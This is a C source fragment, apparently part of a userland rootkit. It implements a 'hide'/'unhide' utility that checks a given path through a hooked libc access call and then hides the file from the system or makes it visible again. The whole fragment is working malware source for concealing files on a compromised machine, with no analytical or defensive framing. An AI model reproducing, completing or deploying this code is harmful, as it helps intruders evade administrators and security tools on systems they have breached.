void option_err(void){
    printf("%s\n", ERR_NO_OPTION);
    exit(-1);
}

void dohiding_util(char *const argv[]){
    char *option, *path;
    int path_status;
    hook(CACCESS);

    option = argv[1];
    if(option == NULL) option_err();

    path = argv[2];
    if(path != NULL){
        /* verify path actually exists... */
        path_status = (long)call(CACCESS, path, F_OK);

        if(path_status < 0 && errno == ENOENT){
            printf("%s\n", ERR_STAT_PATH);
            exit(-1);   /* path doesn't exist... */
        }
    }else option_err();

    /* hide or unhide given path */
    if(!strncmp("hide", option, 4)){
        switch(hide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_HIDDEN_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_HIDDEN_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_HIDING_PATH);
                break;
        }
    }else if(!strncmp("unhide", option, 6)){
        switch(unhide_path(path)){
            case PATH_DONE:
                printf("%s\n", ALRDY_VISIBLE_STR);
                break;
            case PATH_SUCC:
                printf("%s\n", PATH_VISIBLE_STR);
                break;
            case PATH_ERR:
                printf("%s\n", ERR_UNHIDING_PATH);
                break;
        }
    }else option_err();

    /* done... exit so that the calling function doesn't
     * spaz out about not being able to find './bdv' */
    exit(0);
}